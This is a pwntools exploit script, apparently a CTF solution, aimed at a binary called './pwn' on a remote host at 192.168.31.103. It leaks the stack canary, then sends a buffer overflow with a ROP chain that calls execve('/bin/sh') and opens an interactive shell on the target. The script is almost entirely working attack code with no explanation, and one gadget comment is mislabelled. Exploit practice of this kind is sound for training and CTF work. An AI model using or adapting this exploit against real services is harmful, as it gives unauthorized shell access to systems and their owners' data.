# 以下代码来自归海言诺
from pwn import *
 
# one_getshell: list[int] = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
 
context.log_level = 'debug'
context.arch = 'amd64'
 
# io = process("./pwn")
io = remote("192.168.31.103",9118)
file = ELF("./pwn")

 
io.sendafter(b"id?", b'a'*(24) + b'g')
io.recvuntil(b"g")
canary = u64(b'\x00' + io.recv(7))
log.success(f"canary:{hex(canary)}")

payload = flat([
    cyclic(0x20-0x8),
    p64(canary),
    cyclic(0x8),
 
    file.search(asm('pop rax; ret;')).__next__(),  # pop rdi; ret
    59,
    file.search(asm("pop rdi; ret;")).__next__(),  # pop rdi; ret
    file.search("/bin/sh").__next__(),
    file.search(asm("pop rsi; ret;")).__next__(),  # pop rsi; ret
    0,
    p64(0x000000000049d12b),  # pop rdx ; pop rbx ; ret
    0,  # rdx
    0,  # rbx
    file.search(asm("syscall")).__next__(),
])
 
io.sendafter(b"name?",payload)
io.sendafter(b"quit",b"-1234")
io.interactive()